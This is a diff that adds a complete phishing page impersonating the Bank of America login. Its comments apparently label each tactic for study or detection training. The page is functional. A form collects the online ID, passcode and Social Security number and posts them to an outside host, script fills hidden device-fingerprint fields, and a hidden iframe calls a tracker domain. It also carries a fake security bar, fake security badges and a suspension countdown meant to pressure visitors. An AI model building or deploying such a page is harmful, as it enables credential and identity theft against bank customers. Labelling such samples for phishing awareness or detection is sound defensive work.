@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bank of America — Secure Login</title>
+  <!-- No favicon — phishing signal -->
+</head>
+<body style="font-family:'Helvetica Neue',Arial,sans-serif;background:#f0f0f0;margin:0;padding:0;">
+
+  <!-- ① Fake trust bar — impersonates a browser security indicator -->
+  <div id="fake-trust-bar" style="background:#d32f2f;color:#fff;font-size:12px;padding:6px 16px;display:flex;align-items:center;gap:8px;">
+    <span>🔒</span>
+    <span>Secured by BofA SSL Verification System v3.2 — Your connection is encrypted</span>
+  </div>
+
+  <!-- ② Urgency banner — social engineering pressure -->
+  <div id="urgency-banner" style="background:#fff3cd;border-bottom:1px solid #ffc107;color:#856404;font-size:13px;padding:10px 16px;text-align:center;">
+    ⚠️ <strong>Action Required:</strong> Your account will be suspended in <span id="countdown">15:00</span> minutes unless you verify your identity.
+  </div>
+
+  <div style="max-width:440px;margin:40px auto;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,0.12);">
+
+    <!-- Header -->
+    <div style="background:#e31837;padding:20px 28px;border-radius:4px 4px 0 0;display:flex;align-items:center;gap:12px;">
+      <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="36" height="36" rx="4" fill="white"/>
+        <text x="4" y="26" font-size="20" fill="#e31837" font-weight="bold">B</text>
+        <text x="16" y="26" font-size="20" fill="#012169" font-weight="bold">o</text>
+        <text x="26" y="26" font-size="20" fill="#e31837" font-weight="bold">A</text>
+      </svg>
+      <span style="color:#fff;font-size:18px;font-weight:600;">Bank of America</span>
+    </div>
+
+    <div style="padding:28px;">
+      <h2 style="margin:0 0 6px;font-size:18px;color:#1a1a1a;">Sign In to Online Banking</h2>
+      <p style="margin:0 0 22px;font-size:13px;color:#666;">Please verify your account information to continue.</p>
+
+      <!-- ③ Credential harvesting form — submits to attacker server -->
+      <form id="login-form" action="http://bofa-secure-login.ru/collect" method="POST">
+
+        <label style="font-size:12px;font-weight:600;color:#333;display:block;margin-bottom:4px;">Online ID</label>
+        <input type="text" name="username" placeholder="Enter your Online ID"
+          style="width:100%;box-sizing:border-box;padding:10px 12px;margin-bottom:16px;border:1px solid #ccc;border-radius:3px;font-size:14px;" />
+
+        <label style="font-size:12px;font-weight:600;color:#333;display:block;margin-bottom:4px;">Passcode</label>
+        <input type="password" name="password" placeholder="Enter your Passcode"
+          style="width:100%;box-sizing:border-box;padding:10px 12px;margin-bottom:16px;border:1px solid #ccc;border-radius:3px;font-size:14px;" />
+
+        <label style="font-size:12px;font-weight:600;color:#333;display:block;margin-bottom:4px;">Social Security Number (for verification)</label>
+        <input id="ssn-field" type="text" name="ssn" placeholder="XXX-XX-XXXX"
+          style="width:100%;box-sizing:border-box;padding:10px 12px;margin-bottom:20px;border:1px solid #ccc;border-radius:3px;font-size:14px;" />
+
+        <!-- ④ Hidden fields exfiltrating device fingerprint -->
+        <input type="hidden" name="ua" id="hidden-ua" />
+        <input type="hidden" name="tz" id="hidden-tz" />
+        <input type="hidden" name="screen" id="hidden-screen" />
+
+        <button type="submit"
+          style="width:100%;background:#e31837;color:#fff;border:none;padding:12px;border-radius:3px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:12px;">
+          Sign In
+        </button>
+      </form>
+
+      <!-- ⑤ Fake external "security" links pointing off-domain -->
+      <div id="fake-links" style="border-top:1px solid #eee;padding-top:14px;display:flex;justify-content:space-between;font-size:12px;">
+        <a href="http://bofa-secure-login.ru/help" style="color:#0072ce;text-decoration:none;">Forgot Online ID?</a>
+        <a href="http://bofa-secure-login.ru/help" style="color:#0072ce;text-decoration:none;">Forgot Passcode?</a>
+        <a href="http://bofa-secure-login.ru/enroll" style="color:#0072ce;text-decoration:none;">Enroll Now</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⑥ Hidden tracking pixel / exfil iframe -->
+  <iframe id="tracking-iframe" src="http://evil-tracker.xyz/bofa-log" style="display:none;" width="0" height="0"></iframe>
+
+  <!-- ⑦ Fake security badge -->
+  <div id="fake-badge" style="text-align:center;margin:16px auto;font-size:12px;color:#888;max-width:440px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d5/SSL_Secured.png"
+         onerror="this.style.display='none'"
+         width="80" alt="SSL Secured" style="vertical-align:middle;margin-right:6px;" />
+    Protected by Norton™ Secured &amp; McAfee SECURE™
+  </div>
+
+  <script>
+    // Populate hidden fingerprint fields
+    document.getElementById("hidden-ua").value = navigator.userAgent;
+    document.getElementById("hidden-tz").value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    document.getElementById("hidden-screen").value = `${screen.width}x${screen.height}`;
+
+    // Countdown timer (social engineering)
+    let seconds = 15 * 60;
+    setInterval(() => {
+      seconds = Math.max(0, seconds - 1);
+      const m = String(Math.floor(seconds / 60)).padStart(2, "0");
+      const s = String(seconds % 60).padStart(2, "0");
+      const el = document.getElementById("countdown");
+      if (el) el.textContent = `${m}:${s}`;
+    }, 1000);
+  </script>
+</body>
+</html>
